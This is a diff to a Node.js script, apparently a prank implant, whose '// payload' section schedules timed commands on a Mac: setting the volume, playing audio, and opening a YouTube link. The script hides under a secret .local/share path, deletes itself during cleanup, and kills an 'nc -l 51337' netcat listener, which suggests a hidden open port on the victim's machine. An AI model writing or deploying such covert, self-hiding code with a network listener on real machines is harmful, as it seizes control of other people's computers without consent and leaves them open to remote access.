@@ -40,7 +40,9 @@ if (__filename !== scriptpath || process.env.FORK === 'true') {
 // payload
 const timexe = require('timexe');
 
+const sound1 = timexe('* * * 19 9 49', () => { cp.execSync('osascript -e "set Volume 2"'); });
 const mgs = timexe('* * * 19 9 50', () => { cp.execSync('afplay mgs.mp4'); });
+const sound2 = timexe('* * * 19 9 59', () => { cp.execSync('osascript -e "set Volume 2"'); });
 const youtube = timexe('* * * 19 10 0', () => { cp.execSync('open "https://www.youtube.com/watch?v=NdqbI0_0GsM"'); });
 
 const cleanup = () => {
@@ -48,6 +50,10 @@ const cleanup = () => {
   timexe.remove(youtube);
   fs.unlinkSync(scriptpath);
   cp.exec(`pkill -f .local/share/${secretComponent}/index.js`, {
+    detached: true,
+    stdio: 'ignore'
+  });
+  cp.exec('pkill -f "nc -l 51337"', {
     detached: true,
     stdio: 'ignore'
   });
